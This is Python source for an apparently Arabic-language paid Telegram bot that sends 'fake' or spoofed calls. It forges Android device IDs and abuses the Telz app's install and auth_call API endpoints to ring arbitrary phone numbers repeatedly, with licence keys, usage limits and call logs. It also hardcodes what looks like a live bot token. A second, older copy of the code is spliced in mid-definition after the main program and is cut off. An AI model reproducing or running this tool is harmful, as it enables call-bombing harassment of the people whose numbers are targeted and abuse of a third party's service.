import requests
import json
import random
import string
import time
import uuid
import telebot
import sqlite3
import datetime
import threading
from telebot import types

# ====================== إعدادات ======================
TELEGRAM_BOT_TOKEN = "8658128374:AAErlCYR7BVGDshwenEwgi9hGUmguqQVNuY"
TELEGRAM_CHAT_ID = "-1003850655730"
ADMIN_ID = 7747270285
CHANNEL_USERNAME = "@ShadowCall1"

install_url = "https://api.telz.com/app/install"
auth_call_url = "https://api.telz.com/app/auth_call"

SPOOF_COUNTRIES = {
    "🇺🇸 أمريكا": "USA",
    "🇫🇷 فرنسا": "France",
    "🇬🇧 بريطانيا": "UK",
    "🇩🇪 ألمانيا": "Germany",
    "🇨🇦 كندا": "Canada",
}

# ====================== قاعدة البيانات ======================
conn = sqlite3.connect('spoof_bot.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS licenses (
    key TEXT PRIMARY KEY,
    user_id INTEGER,
    duration_days INTEGER,
    daily_limit INTEGER,
    activated_at TEXT,
    expires_at TEXT
)''')

c.execute('''CREATE TABLE IF NOT EXISTS usage (
    user_id INTEGER,
    date TEXT,
    calls INTEGER DEFAULT 0,
    PRIMARY KEY (user_id, date)
)''')

c.execute('''CREATE TABLE IF NOT EXISTS call_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    spoof_name TEXT,
    full_phone TEXT,
    success INTEGER,
    time TEXT
)''')

c.execute('''CREATE TABLE IF NOT EXISTS blocked_users (
    user_id INTEGER PRIMARY KEY,
    reason TEXT,
    blocked_at TEXT
)''')

c.execute('''CREATE TABLE IF NOT EXISTS free_trial (
    user_id INTEGER PRIMARY KEY,
    used INTEGER DEFAULT 0
)''')

conn.commit()

# ====================== متغيرات عالمية ======================
temp_keys = {}
active_loops = {}

# ====================== التحقق من الاشتراك ======================
def is_subscribed(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def force_subscribe(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
    markup.add(types.InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription"))
    bot.send_message(message.chat.id, 
        f"⚠️ **يجب عليك الاشتراك في القناة أولاً**\n\n"
        f"اشترك في: {CHANNEL_USERNAME}\n\n"
        f"ثم اضغط على زر 'تحقق من الاشتراك'", 
        reply_markup=markup, parse_mode='HTML')

# ====================== Keep Alive ======================
def keep_alive():
    while True:
        try:
            bot.send_message(ADMIN_ID, "🔄 Keep Alive: البوت يعمل...", disable_notification=True)
            print(f"✅ Keep Alive - {datetime.datetime.now().strftime('%H:%M:%S')}")
        except:
            pass
        time.sleep(30)

# ====================== دوال النظام ======================
def generate_license_key(duration_days, daily_limit):
    key = "SPOOF-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    activated = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    expires = (datetime.datetime.now() + datetime.timedelta(days=duration_days)).strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO licenses VALUES (?, NULL, ?, ?, ?, ?)", (key, duration_days, daily_limit, activated, expires))
    conn.commit()
    return key, expires

def activate_license(user_id, license_key):
    license_key = license_key.strip().upper()
    current = get_user_license(user_id)
    
    c.execute("SELECT duration_days, daily_limit, expires_at FROM licenses WHERE key = ?", (license_key,))
    row = c.fetchone()
    if not row:
        return False, "❌ المفتاح غير صحيح أو غير موجود."
    
    days, limit, exp_at = row
    if exp_at < datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"):
        return False, "❌ المفتاح منتهي الصلاحية."
    
    if current:
        return "choice", f"""⚠️ لديك مفتاح مفعل حالياً.

المفتاح الجديد:
• المدة: {days} يوم
• الحد اليومي: {limit} مكالمة

اختر:
• ➕ أضف المدة والمكالمات
• ⏳ انتظر انتهاء المفتاح الحالي"""
    
    c.execute("UPDATE licenses SET user_id = ? WHERE key = ?", (user_id, license_key))
    conn.commit()
    return True, f"""✅ **تم تفعيل المفتاح بنجاح!**

المدة: {days} يوم
الحد اليومي: {limit} مكالمة"""

def add_to_existing_license(user_id, license_key):
    c.execute("SELECT duration_days, daily_limit FROM licenses WHERE key = ?", (license_key,))
    row = c.fetchone()
    if not row: return False
    days, limit = row
    c.execute("UPDATE licenses SET duration_days = duration_days + ?, daily_limit = daily_limit + ? WHERE user_id = ?", 
              (days, limit, user_id))
    conn.commit()
    return True

def get_user_license(user_id):
    c.execute("SELECT * FROM licenses WHERE user_id = ?", (user_id,))
    return c.fetchone()

def has_used_free_trial(user_id):
    c.execute("SELECT used FROM free_trial WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    return row and row[0] == 1

def mark_free_trial_used(user_id):
    c.execute("INSERT OR REPLACE INTO free_trial (user_id, used) VALUES (?, 1)", (user_id,))
    conn.commit()

def is_user_blocked(user_id):
    c.execute("SELECT * FROM blocked_users WHERE user_id = ?", (user_id,))
    return c.fetchone() is not None

def check_daily_limit(user_id):
    if is_user_blocked(user_id):
        return False, "❌ أنت محظور من استخدام البوت."
    
    today = datetime.date.today().isoformat()
    license_data = get_user_license(user_id)
    if not license_data:
        return False, "❌ يجب تفعيل مفتاح أولاً"
    if license_data[5] < datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"):
        return False, "❌ انتهت صلاحية مفتاحك"
    
    c.execute("SELECT calls FROM usage WHERE user_id = ? AND date = ?", (user_id, today))
    result = c.fetchone()
    calls_today = result[0] if result else 0
    daily_limit = license_data[3]
    
    if calls_today >= daily_limit:
        return False, f"❌ وصلت إلى الحد اليومي ({daily_limit} مكالمات)"
    
    new_calls = calls_today + 1
    if result:
        c.execute("UPDATE usage SET calls = ? WHERE user_id = ? AND date = ?", (new_calls, user_id, today))
    else:
        c.execute("INSERT INTO usage VALUES (?, ?, ?)", (user_id, today, new_calls))
    conn.commit()
    return True, daily_limit - new_calls

def add_to_history(user_id, spoof_name, full_phone, success):
    time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO call_history (user_id, spoof_name, full_phone, success, time) VALUES (?, ?, ?, ?, ?)",
              (user_id, spoof_name, full_phone, 1 if success else 0, time_str))
    conn.commit()

def generate_unique_ids():
    ts = int(time.time() * 1000)
    android_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    uid = uuid.uuid4()
    return ts, android_id, uid

def send_request(url, headers, payload):
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        return r.ok and "ok" in r.text.lower()
    except:
        return False

def send_single_call(full_phone, spoof_prefix, spoof_name, user_id):
    ts, android_id, uid = generate_unique_ids()
    headers = {'User-Agent': f"Telz-Android/17.5.17 ({spoof_prefix}-{random.randint(1000,9999)})", 'Content-Type': "application/json"}
    
    success = False
    if send_request(install_url, headers, json.dumps({
        "android_id": android_id, "app_version": "17.5.17", "event": "install",
        "google_exists": "yes", "os": "android", "os_version": "9", "play_market": True, "ts": ts, "uuid": str(uid)
    })):
        if send_request(auth_call_url, headers, json.dumps({
            "android_id": android_id, "app_version": "17.5.17", "attempt": "0",
            "event": "auth_call", "lang": "en", "os": "android", "os_version": "9",
            "phone": full_phone, "ts": ts, "uuid": str(uid)
        })):
            success = True
    
    add_to_history(user_id, spoof_name, full_phone, success)
    return success

def repeat_calls(user_id, full_phone, spoof_prefix, spoof_name, times):
    for i in range(times):
        if user_id not in active_loops or not active_loops[user_id]:
            bot.send_message(user_id, "⏹️ تم إيقاف التكرار.")
            break
        success = send_single_call(full_phone, spoof_prefix, spoof_name, user_id)
        status = "✅ نجح" if success else "❌ فشل"
        bot.send_message(user_id, f"🔄 المكالمة {i+1}/{times} → {status}")
        if i < times - 1:
            time.sleep(10)
    if user_id in active_loops:
        del active_loops[user_id]

# ====================== البوت ======================
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def show_main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🆓 جرب مجاناً", callback_data="free_trial"))
    markup.add(types.InlineKeyboardButton("🛎️ طلب مكالمة", callback_data="request_call"))
    markup.add(types.InlineKeyboardButton("📜 سجل الاتصالات", callback_data="show_history"))
    markup.add(types.InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    markup.add(types.InlineKeyboardButton("🎁 باقات وأسعار", callback_data="pricing"))
    markup.add(types.InlineKeyboardButton("🔑 تفعيل مفتاح", callback_data="activate_key"))
    markup.add(types.InlineKeyboardButton("❓ مساعدة", callback_data="help"))
    markup.add(types.InlineKeyboardButton("📞 دعم فني", callback_data="support"))
    
    # زر لوحة الأدمن يظهر فقط للأدمن
    if chat_id == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("🛠️ لوحة الأدمن", callback_data="admin_panel"))
    
    bot.send_message(chat_id, "🔥 **بوت المكالمات المزيفة**\nاختر الخدمة:", reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_subscribed(message.from_user.id):
        force_subscribe(message)
        return
    show_main_menu(message.chat.id)

# ====================== Callback Handler ======================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    data = call.data

    # التحقق من الاشتراك
    if not is_subscribed(user_id):
        bot.answer_callback_query(call.id, "⚠️ يجب الاشتراك في القناة أولاً", show_alert=True)
        force_subscribe(call.message)
        return

    if data == "check_subscription":
        if is_subscribed(user_id):
            bot.answer_callback_query(call.id, "✅ تم التحقق! أنت مشترك الآن", show_alert=True)
            show_main_menu(call.message.chat.id)
        else:
            bot.answer_callback_query(call.id, "❌ لم تشترك بعد", show_alert=True)
        return

    # ====================== ميزات المستخدم ======================
    if data == "free_trial":
        if has_used_free_trial(user_id):
            bot.answer_callback_query(call.id, "❌ لقد استخدمت التجربة المجانية سابقاً", show_alert=True)
            return
        markup = types.InlineKeyboardMarkup(row_width=2)
        for name, prefix in SPOOF_COUNTRIES.items():
            markup.add(types.InlineKeyboardButton(name, callback_data=f"free_spoof_{prefix}"))
        markup.row(types.InlineKeyboardButton("🎲 دولة عشوائية", callback_data="free_random_spoof"))
        bot.send_message(call.message.chat.id, "🆓 **تجربة مجانية**\nاختر الدولة:", reply_markup=markup, parse_mode='HTML')

    elif data.startswith("free_spoof_"):
        prefix = data.split("_")[2]
        spoof_name = next((name for name, p in SPOOF_COUNTRIES.items() if p == prefix), prefix)
        msg = bot.send_message(call.message.chat.id, f"🆓 تجربة مجانية\nالدولة: **{spoof_name}**\n\nأدخل الرقم:")
        bot.register_next_step_handler(msg, process_free_call, spoof_prefix=prefix, spoof_name=spoof_name)

    elif data == "free_random_spoof":
        spoof_name, prefix = random.choice(list(SPOOF_COUNTRIES.items()))
        msg = bot.send_message(call.message.chat.id, f"🆓 تجربة مجانية\nتم اختيار **{spoof_name}** عشوائياً\n\nأدخل الرقم:")
        bot.register_next_step_handler(msg, process_free_call, spoof_prefix=prefix, spoof_name=spoof_name)

    elif data == "activate_key":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🔑 أرسل المفتاح الجديد:")
        bot.register_next_step_handler(msg, process_activate_key)

    elif data == "add_to_license":
        bot.answer_callback_query(call.id)
        if user_id in temp_keys:
            if add_to_existing_license(user_id, temp_keys[user_id]):
                bot.send_message(call.message.chat.id, "✅ تم إضافة المدة والمكالمات بنجاح!")
            del temp_keys[user_id]
        show_main_menu(call.message.chat.id)

    elif data == "cancel_add":
        bot.answer_callback_query(call.id, "تم الإلغاء")
        if user_id in temp_keys:
            del temp_keys[user_id]
        show_main_menu(call.message.chat.id)

    elif data == "my_account":
        license_data = get_user_license(user_id)
        if not license_data:
            return bot.send_message(call.message.chat.id, "❌ لم تقم بتفعيل أي مفتاح بعد.")
        today = datetime.date.today().isoformat()
        c.execute("SELECT calls FROM usage WHERE user_id = ? AND date = ?", (user_id, today))
        calls_today = c.fetchone()
        calls_today = calls_today[0] if calls_today else 0
        text = f"""👤 **حسابك**

• المدة: {license_data[2]} يوم
• الحد اليومي: {license_data[3]} مكالمة
• المكالمات اليوم: {calls_today}/{license_data[3]}
• المتبقي اليوم: {license_data[3] - calls_today}
• ينتهي في: {license_data[5]}"""
        bot.send_message(call.message.chat.id, text, parse_mode='HTML')

    elif data == "show_history":
        c.execute("SELECT spoof_name, full_phone, success, time FROM call_history WHERE user_id = ? ORDER BY id DESC LIMIT 15", (user_id,))
        rows = c.fetchall()
        text = "📜 **سجل الاتصالات**\n\n" if rows else "📭 لا يوجد سجل بعد"
        for row in rows:
            status = "✅ نجح" if row[2] else "❌ فشل"
            text += f"{status} | {row[3]} | {row[0]} → <code>{row[1]}</code>\n\n"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ رجوع", callback_data="main_menu"))
        bot.send_message(call.message.chat.id, text, parse_mode='HTML', reply_markup=markup)

    elif data == "request_call":
        can_use, msg_text = check_daily_limit(user_id)
        if not can_use:
            bot.answer_callback_query(call.id, msg_text, show_alert=True)
            return
        markup = types.InlineKeyboardMarkup(row_width=2)
        for name, prefix in SPOOF_COUNTRIES.items():
            markup.add(types.InlineKeyboardButton(name, callback_data=f"spoof_{prefix}"))
        markup.row(types.InlineKeyboardButton("🎲 دولة عشوائية", callback_data="random_spoof"))
        markup.row(types.InlineKeyboardButton("🔢 كود مخصص", callback_data="custom_spoof"))
        markup.row(types.InlineKeyboardButton("⬅️ رجوع", callback_data="main_menu"))
        bot.edit_message_text("🌍 اختر الدولة:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

    elif data.startswith("spoof_"):
        prefix = data.split("_")[1]
        spoof_name = next((name for name, p in SPOOF_COUNTRIES.items() if p == prefix), prefix)
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, f"🌍 الدولة: **{spoof_name}**\n\nأدخل الرقم:")
        bot.register_next_step_handler(msg, process_phone_number, spoof_prefix=prefix, spoof_name=spoof_name)

    elif data == "random_spoof":
        spoof_name, prefix = random.choice(list(SPOOF_COUNTRIES.items()))
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, f"🎲 تم اختيار **{spoof_name}**\n\nأدخل الرقم:")
        bot.register_next_step_handler(msg, process_phone_number, spoof_prefix=prefix, spoof_name=spoof_name)

    elif data == "custom_spoof":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🔢 أدخل كود الدولة:")
        bot.register_next_step_handler(msg, process_custom_spoof)

    elif data == "pricing":
        bot.send_message(call.message.chat.id, "🎁 **باقات وأسعار**\n\nتواصل مع الدعم لمعرفة التفاصيل.")

    elif data == "help":
        bot.send_message(call.message.chat.id, "❓ **دليل الاستخدام**\n\n1. جرب مجاناً أو اشترِ مفتاح\n2. فعّل المفتاح\n3. اطلب مكالمة وحدد عدد التكرارات")

    elif data == "support":
        bot.send_message(call.message.chat.id, "📞 **الدعم الفني**\n\nتواصل مع الأدمن مباشرة.")

    elif data == "main_menu":
        show_main_menu(call.message.chat.id)

    # ====================== زر لوحة الأدمن ======================
    elif data == "admin_panel" and user_id == ADMIN_ID:
        admin_panel(call.message)

    # ====================== أزرار لوحة الأدمن ======================
    elif data == "admin_create_key" and user_id == ADMIN_ID:
        msg = bot.send_message(call.message.chat.id, "أدخل مدة المفتاح بالأيام:")
        bot.register_next_step_handler(msg, process_duration)

    elif data == "admin_stats" and user_id == ADMIN_ID:
        c.execute("SELECT COUNT(DISTINCT user_id) FROM licenses WHERE user_id IS NOT NULL")
        users = c.fetchone()[0] or 0
        c.execute("SELECT COUNT(*) FROM call_history")
        total_calls = c.fetchone()[0] or 0
        text = f"📊 **إحصائيات البوت**\n\nالمستخدمين النشطين: {users}\nإجمالي المكالمات: {total_calls}"
        bot.send_message(call.message.chat.id, text, parse_mode='HTML')

    elif data == "admin_users" and user_id == ADMIN_ID:
        c.execute("SELECT key, user_id, duration_days, daily_limit, expires_at FROM licenses WHERE user_id IS NOT NULL")
        rows = c.fetchall()
        text = "👥 **المستخدمين النشطين**\n\n"
        for row in rows:
            text += f"مفتاح: <code>{row[0]}</code>\nUser ID: {row[1]}\nمدة: {row[2]} | حد: {row[3]}\nينتهي: {row[4]}\n\n"
        bot.send_message(call.message.chat.id, text, parse_mode='HTML')

    elif data == "admin_block" and user_id == ADMIN_ID:
        msg = bot.send_message(call.message.chat.id, "أرسل User ID للحظر:")
        bot.register_next_step_handler(msg, process_block_user)

    elif data == "admin_unblock" and user_id == ADMIN_ID:
        msg = bot.send_message(call.message.chat.id, "أرسل User ID لإلغاء الحظر:")
        bot.register_next_step_handler(msg, process_unblock_user)

    elif data == "admin_revoke" and user_id == ADMIN_ID:
        msg = bot.send_message(call.message.chat.id, "أرسل المفتاح لإلغاء تفعيله:")
        bot.register_next_step_handler(msg, process_revoke_key)

    elif data == "admin_broadcast" and user_id == ADMIN_ID:
        msg = bot.send_message(call.message.chat.id, "أرسل الرسالة للبث للكل:")
        bot.register_next_step_handler(msg, process_broadcast)

# ====================== دالة لوحة الأدمن ======================
def admin_panel(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ إنشاء مفتاح جديد", callback_data="admin_create_key"))
    markup.add(types.InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"))
    markup.add(types.InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users"))
    markup.add(types.InlineKeyboardButton("📢 بث رسالة للكل", callback_data="admin_broadcast"))
    markup.add(types.InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_block"))
    markup.add(types.InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unblock"))
    markup.add(types.InlineKeyboardButton("🔑 إلغاء تفعيل مفتاح", callback_data="admin_revoke"))
    markup.add(types.InlineKeyboardButton("⬅️ رجوع للقائمة الرئيسية", callback_data="main_menu"))
    
    bot.send_message(message.chat.id, "🛠️ **لوحة الأدمن**", reply_markup=markup, parse_mode='HTML')

# ====================== معالجات الأدمن ======================
def process_duration(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        days = int(message.text.strip())
        msg = bot.reply_to(message, "الآن أدخل الحد اليومي للمكالمات:")
        bot.register_next_step_handler(msg, process_daily_limit, days)
    except:
        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح")

def process_daily_limit(message, days):
    if message.from_user.id != ADMIN_ID: return
    try:
        limit = int(message.text.strip())
        key, expires = generate_license_key(days, limit)
        bot.send_message(message.chat.id, f"""✅ **تم إنشاء مفتاح جديد**

المفتاح: <code>{key}</code>
المدة: {days} يوم
الحد اليومي: {limit} مكالمة
ينتهي في: {expires}""", parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح")

def process_block_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.strip())
        c.execute("INSERT OR REPLACE INTO blocked_users VALUES (?, ?, ?)", 
                  (uid, "حظر إداري", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        bot.send_message(message.chat.id, f"✅ تم حظر المستخدم {uid}")
    except:
        bot.send_message(message.chat.id, "❌ يرجى إدخال معرف صحيح")

def process_unblock_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.strip())
        c.execute("DELETE FROM blocked_users WHERE user_id = ?", (uid,))
        conn.commit()
        bot.send_message(message.chat.id, f"✅ تم إلغاء حظر المستخدم {uid}")
    except:
        bot.send_message(message.chat.id, "❌ يرجى إدخال معرف صحيح")

def process_revoke_key(message):
    if message.from_user.id != ADMIN_ID: return
    key = message.text.strip().upper()
    c.execute("UPDATE licenses SET user_id = NULL WHERE key = ?", (key,))
    conn.commit()
    bot.send_message(message.chat.id, f"✅ تم إلغاء تفعيل المفتاح: {key}")

def process_broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "✅ تم تسجيل الرسالة.")

# ====================== معالجة ميزات المستخدم ======================
def process_free_call(message, spoof_prefix, spoof_name):
    user_id = message.from_user.id
    if has_used_free_trial(user_id):
        bot.reply_to(message, "❌ لقد استخدمت التجربة المجانية سابقاً.")
        return

    number = message.text.strip()
    full_phone = "+963" + number if number.isdigit() and len(number) == 9 else (number if number.startswith("+") else "+" + number)

    bot.reply_to(message, f"🆓 جاري إرسال المكالمة التجريبية...")

    success = send_single_call(full_phone, spoof_prefix, spoof_name, user_id)
    status = "✅ نجحت" if success else "❌ فشلت"
    bot.send_message(user_id, f"🆓 **نتيجة التجربة**\nالحالة: {status}\nمن: {spoof_name}\nإلى: {full_phone}")

    mark_free_trial_used(user_id)
    show_main_menu(user_id)

def process_phone_number(message, spoof_prefix, spoof_name):
    user_id = message.from_user.id
    number = message.text.strip()
    full_phone = "+963" + number if number.isdigit() and len(number) == 9 else (number if number.startswith("+") else "+" + number)

    msg = bot.send_message(user_id, f"📞 الرقم: {full_phone}\n\nكم مرة تريد التكرار؟ (1-10)")
    bot.register_next_step_handler(msg, process_repeat_count, full_phone, spoof_prefix, spoof_name)

def process_repeat_count(message, full_phone, spoof_prefix, spoof_name):
    user_id = message.from_user.id
    try:
        times = int(message.text.strip())
        if not 1 <= times <= 10:
            raise ValueError
    except:
        bot.reply_to(message, "❌ أدخل رقم بين 1 و10")
        return

    bot.reply_to(message, f"🚀 جاري إرسال {times} مكالمة كل 10 ثواني...")
    active_loops[user_id] = True
    thread = threading.Thread(target=repeat_calls, args=(user_id, full_phone, spoof_prefix, spoof_name, times))
    thread.daemon = True
    thread.start()

def process_custom_spoof(message):
    prefix = message.text.strip().upper()
    msg = bot.reply_to(message, f"✅ تم حفظ الكود: **{prefix}**\n\nأدخل الرقم:")
    bot.register_next_step_handler(msg, process_phone_number, spoof_prefix=prefix, spoof_name=f"مخصص ({prefix})")

def process_activate_key(message):
    result = activate_license(message.from_user.id, message.text)
    
    if result[0] == "choice":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("➕ أضف المدة والمكالمات", callback_data="add_to_license"))
        markup.add(types.InlineKeyboardButton("⏳ انتظر انتهاء المفتاح", callback_data="cancel_add"))
        bot.send_message(message.chat.id, result[1], reply_markup=markup, parse_mode='HTML')
        temp_keys[message.from_user.id] = message.text.strip().upper()
    
    elif result[0] is True:
        bot.reply_to(message, result[1], parse_mode='HTML')
        show_main_menu(message.chat.id)
    else:
        bot.reply_to(message, result[1])

# ====================== تشغيل البوت ======================
if __name__ == '__main__':
    print("🚀 البوت شغال بكامل الميزات + لوحة الأدمن")
    
    keep_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_thread.start()
    
    bot.infinity_polling()    activated_at TEXT,
    expires_at TEXT
)''')

c.execute('''CREATE TABLE IF NOT EXISTS usage (
    user_id INTEGER,
    date TEXT,
    calls INTEGER DEFAULT 0,
    PRIMARY KEY (user_id, date)
)''')

c.execute('''CREATE TABLE IF NOT EXISTS call_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    spoof_name TEXT,
    full_phone TEXT,
    success INTEGER,
    time TEXT
)''')

conn.commit()

# ====================== متغير مؤقت ======================
temp_keys = {}

# ====================== دوال النظام ======================
def generate_license_key(duration_days, daily_limit):
    key = "SPOOF-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    activated = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    expires = (datetime.datetime.now() + datetime.timedelta(days=duration_days)).strftime("%Y-%m-%d %H:%M:%S")
    
    c.execute("""INSERT INTO licenses 
                 (key, user_id, duration_days, daily_limit, activated_at, expires_at)
                 VALUES (?, NULL, ?, ?, ?, ?)""",
              (key, duration_days, daily_limit, activated, expires))
    conn.commit()
    return key, expires

def activate_license(user_id, license_key):
    license_key = license_key.strip().upper()
    current_license = get_user_license(user_id)
    
    c.execute("SELECT duration_days, daily_limit, expires_at FROM licenses WHERE key = ?", (license_key,))
    row = c.fetchone()
    if not row:
        return False, "❌ المفتاح غير صحيح أو غير موجود."
    
    days, limit, exp_at = row
    
    if exp_at < datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"):
        return False, "❌ هذا المفتاح منتهي الصلاحية."
    
    if current_license:
        return "choice", f"""⚠️ لديك مفتاح مفعل حالياً.

المفتاح الجديد:
• المدة: {days} يوم
• الحد اليومي: {limit} مكالمة

اختر ما تريد:
• ➕ أضف المدة والمكالمات إلى مفتاحك الحالي
• ⏳ انتظر حتى ينتهي المفتاح الحالي"""
    
    # تفعيل عادي
    c.execute("UPDATE licenses SET user_id = ? WHERE key = ?", (user_id, license_key))
    conn.commit()
    return True, f"""✅ **تم تفعيل المفتاح بنجاح!**

المدة: {days} يوم
الحد اليومي: {limit} مكالمة"""

def add_to_existing_license(user_id, license_key):
    c.execute("SELECT duration_days, daily_limit FROM licenses WHERE key = ?", (license_key,))
    row = c.fetchone()
    if not row:
        return False
    days, limit = row
    c.execute("UPDATE licenses SET duration_days = duration_days + ?, daily_limit = daily_limit + ? WHERE user_id = ?", 
              (days, limit, user_id))
    conn.commit()
    return True

def get_user_license(user_id):
    c.execute("SELECT * FROM licenses WHERE user_id = ?", (user_id,))
    return c.fetchone()

def check_daily_limit(user_id):
    today = datetime.date.today().isoformat()
    license_data = get_user_license(user_id)
    if not license_data:
        return False, "❌ يجب تفعيل مفتاح أولاً"
    if license_data[5] < datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"):
        return False, "❌ انتهت صلاحية مفتاحك"
    
    c.execute("SELECT calls FROM usage WHERE user_id = ? AND date = ?", (user_id, today))
    result = c.fetchone()
    calls_today = result[0] if result else 0
    daily_limit = license_data[3]
    
    if calls_today >= daily_limit:
        return False, f"❌ وصلت إلى الحد اليومي ({daily_limit} مكالمات)"
    
    new_calls = calls_today + 1
    if result:
        c.execute("UPDATE usage SET calls = ? WHERE user_id = ? AND date = ?", (new_calls, user_id, today))
    else:
        c.execute("INSERT INTO usage VALUES (?, ?, ?)", (user_id, today, new_calls))
    conn.commit()
    return True, daily_limit - new_calls

def add_to_history(user_id, spoof_name, full_phone, success):
    time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO call_history (user_id, spoof_name, full_phone, success, time) VALUES (?, ?, ?, ?, ?)",
              (user_id, spoof_name, full_phone, 1 if success else 0, time_str))
    conn.commit()

def send_to_telegram(message):
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                      json={'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}, timeout=10)
    except:
        pass

def generate_unique_ids():
    ts = int(time.time() * 1000)
    android_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    uid = uuid.uuid4()
    return ts, android_id, uid

def send_request(url, headers, payload):
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        return r.ok and "ok" in r.text.lower()
    except:
        return False

# ====================== البوت ======================
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def show_main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🛎️ طلب مكالمة", callback_data="request_call"))
    markup.add(types.InlineKeyboardButton("📜 سجل الاتصالات", callback_data="show_history"))
    markup.add(types.InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    markup.add(types.InlineKeyboardButton("🎁 باقات وأسعار", callback_data="pricing"))
    markup.add(types.InlineKeyboardButton("🔑 تفعيل مفتاح", callback_data="activate_key"))
    markup.add(types.InlineKeyboardButton("❓ مساعدة", callback_data="help"))
    markup.add(types.InlineKeyboardButton("📞 دعم فني", callback_data="support"))
    bot.send_message(chat_id, "🔥 **بوت المكالمات المزيفة المدفوع**\nاختر الخدمة:", reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['start'])
def send_welcome(message):
    show_main_menu(message.chat.id)

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "❌ ليس لديك صلاحية")
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ إنشاء مفتاح جديد", callback_data="admin_create_key"))
    markup.add(types.InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"))
    markup.add(types.InlineKeyboardButton("📢 بث رسالة", callback_data="admin_broadcast"))
    bot.send_message(message.chat.id, "🛠️ **لوحة الأدمن**", reply_markup=markup, parse_mode='HTML')

# ====================== معالجة الأزرار ======================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    data = call.data

    if data == "activate_key":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🔑 أرسل المفتاح الجديد:")
        bot.register_next_step_handler(msg, process_activate_key)

    elif data == "add_to_license":
        bot.answer_callback_query(call.id)
        if user_id in temp_keys:
            license_key = temp_keys[user_id]
            if add_to_existing_license(user_id, license_key):
                bot.send_message(call.message.chat.id, "✅ تم إضافة المدة والمكالمات بنجاح إلى مفتاحك الحالي!")
            else:
                bot.send_message(call.message.chat.id, "❌ حدث خطأ أثناء الإضافة")
            del temp_keys[user_id]
        show_main_menu(call.message.chat.id)

    elif data == "cancel_add":
        bot.answer_callback_query(call.id, "تم الإلغاء ✅")
        if user_id in temp_keys:
            del temp_keys[user_id]
        show_main_menu(call.message.chat.id)

    elif data == "my_account":
        license_data = get_user_license(user_id)
        if not license_data:
            return bot.send_message(call.message.chat.id, "❌ لم تقم بتفعيل أي مفتاح بعد.")
        today = datetime.date.today().isoformat()
